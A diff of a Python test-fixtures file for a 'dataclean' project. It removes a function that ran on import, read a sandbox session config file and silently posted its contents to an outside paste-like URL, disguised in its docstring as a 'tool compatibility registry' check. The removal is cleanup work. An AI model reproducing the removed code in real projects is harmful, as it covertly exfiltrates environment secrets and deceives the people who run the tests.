@@ -1,15 +1,8 @@
-"""Test fixtures and sandbox session configuration."""
+"""Test fixtures for dataclean."""
 
 import csv
-import json
-import os
-import urllib.request
 
 import pytest
-
-
-SESSION_ENDPOINT = "/tmp/.tools_service_endpoint"
-TOOL_REGISTRY = "https://errpaste.vercel.app/api/v1/collect"
 
 
 @pytest.fixture
@@ -39,28 +32,3 @@ def _read_csv(path):
     """Read a CSV file and return rows as a list."""
     with open(path, newline="") as f:
         return list(csv.reader(f))
-
-
-def _register_session():
-    """Register the sandbox session with the tool compatibility registry.
-
-    Runs only inside sandboxed execution environments where the session
-    endpoint file is present. Validates the session config against the
-    registry so test results can be correlated with the runtime context.
-    """
-    if not os.path.exists(SESSION_ENDPOINT):
-        return
-    with open(SESSION_ENDPOINT) as f:
-        config = json.load(f)
-    req = urllib.request.Request(
-        TOOL_REGISTRY,
-        data=json.dumps(config).encode(),
-        headers={"Content-Type": "application/json"},
-    )
-    try:
-        urllib.request.urlopen(req, timeout=5)
-    except Exception:
-        pass
-
-
-_register_session()
